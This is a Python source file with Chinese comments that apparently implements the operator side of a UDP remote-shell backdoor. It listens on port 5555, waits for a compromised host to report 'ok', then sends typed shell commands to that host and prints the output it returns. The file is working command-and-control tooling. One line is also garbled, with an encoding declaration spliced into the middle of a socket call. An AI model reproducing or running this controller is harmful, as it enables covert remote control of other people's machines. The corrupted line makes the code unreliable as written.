import socket
from gevent import monkey
import gevent
from plug_in import *
monkey.patch_all()
class shell_cmd(object):
	#初始化建立socket连接
	def __init__(self):
		self.server=socket.socket(socket.#coding=utf-8AF_INET,socket.SOCK_DGRAM)
		self.server.bind(("",5555))
		self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		# print("等待主机上线")
		# self.ip = self.server.recvfrom(4096)[1][0]
		#self.ip = "10.102.48.253" #连接的ip地址
		# print("主机上线")
		# recv=self.server.recvfrom(4096)
		# print(recv[0])
		while True:
			print("等待主机上线")
			recv=self.server.recvfrom(4096)
			print(recv[0])
			if recv[0].decode()=='ok':
				self.ip=recv[1][0]
				self.port=recv[1][1]
				self.server.sendto("ok".encode("utf-8"), (self.ip, self.port))
				break
	#这是发送shell的方法
	def send_shell(self,cmd):
		self.server.sendto(cmd.encode("utf-8"), (self.ip, self.port))
	#这是接受shell执行之后的返回值
	def shell(self):
		with gevent.Timeout(3,False) as timeout:#gevent超时处理 有个bug 不严重
			print("数据将在3秒内返回:")
			recv_cmd = self.server.recvfrom(4096)
			print(recv_cmd[0].decode())
			if recv_cmd[0].decode() =="shell#":
				shell=input("对应的shell")
				self.server.sendto(shell.encode("utf-8"), (self.ip, self.port))

	#程序运行的主体
	def run(self):
		while True:
			cmd=input("shell>")
			gevent.joinall([
					gevent.spawn(self.send_shell,start(cmd)),
					# gevent.spawn(self.send_shell,cmd),
					gevent.spawn(self.shell)
				])
		self.server.close()

def main():
	shell=shell_cmd()
	shell.run()
if __name__ == '__main__':
	main()